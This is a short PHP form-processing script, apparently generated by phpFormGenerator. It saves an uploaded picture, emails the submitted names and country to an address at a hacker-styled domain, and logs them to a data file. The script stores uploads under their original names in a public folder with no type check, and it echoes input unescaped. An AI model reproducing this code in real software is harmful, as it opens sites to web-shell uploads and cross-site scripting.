<?php
include("global.inc.php");
$errors=0;
$error="The following errors occured while processing your form input.<ul>";
pt_register('POST','FirstName');
pt_register('POST','LastName');
pt_register('POST','Country');
$Picture=$HTTP_POST_FILES['Picture'];
if($HTTP_POST_FILES['Picture']['tmp_name']==""){ }
 else if(!is_uploaded_file($HTTP_POST_FILES['Picture']['tmp_name'])){
$error.="<li>The file, ".$HTTP_POST_FILES['Picture']['name'].", was not uploaded!";
$errors=1;
}
if($errors==1) echo $error;
else{
$image_part = date("h_i_s")."_".$HTTP_POST_FILES['Picture']['name'];
$image_list[3] = $image_part;
copy($HTTP_POST_FILES['Picture']['tmp_name'], "files/".$image_part);
$where_form_is="http".($HTTP_SERVER_VARS["HTTPS"]=="on"?"s":"")."://".$SERVER_NAME.strrev(strstr(strrev($PHP_SELF),"/"));
$message="First Name: ".$FirstName."
Last Name: ".$LastName."
Country: ".$Country."
Picture: ".$where_form_is."files/".$image_list[3]."
";
$message = stripslashes($message);
mail("ali@rooty.h4x0rs.us","Form Submitted at your website",$message,"From: phpFormGenerator");
$make=fopen("admin/data.dat","a");
$to_put="";
$to_put .= $FirstName."|".$LastName."|".$Country."|".$where_form_is."files/".$image_list[3]."
";
fwrite($make,$to_put);
?>


<!-- This is the content of the Thank you page, be careful while changing it -->

<h2>Thank you!</h2>

<table width=50%>
<tr><td>First Name: </td><td> <?php echo $FirstName; ?> </td></tr>
<tr><td>Last Name: </td><td> <?php echo $LastName; ?> </td></tr>
<tr><td>Country: </td><td> <?php echo $Country; ?> </td></tr>
<tr><td>Picture: </td><td> <?php echo $Picture; ?> </td></tr>
</table>
<!-- Do not change anything below this line -->

<?php 
}
?>